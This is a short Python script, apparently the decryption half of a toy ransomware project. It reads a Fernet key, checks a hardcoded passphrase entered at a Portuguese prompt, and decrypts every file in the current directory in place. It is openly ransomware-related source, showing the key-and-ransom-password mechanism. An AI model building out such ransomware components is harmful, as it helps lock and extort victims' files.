import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "ransowmare.py" or file == "thekey.key" or file == "decrypt.py":
        continue 

    if os.path.isfile(file):
        files.append(file)

with open("thekey.key","rb") as key:
    key = key.read()

passphrase = "S3uPer_S3$Cret"
upassword = input("Entre com a secret para descriptografar: ") 
if upassword == passphrase:
    for file in files:
        with open(file,"rb") as arquivo:
            content = arquivo.read()
        content_decrypt = Fernet(key).decrypt(content)  
        with open(file,"wb") as thefile:
            thefile.write(content_decrypt)
else:
    print("SENHA ERRADA!!")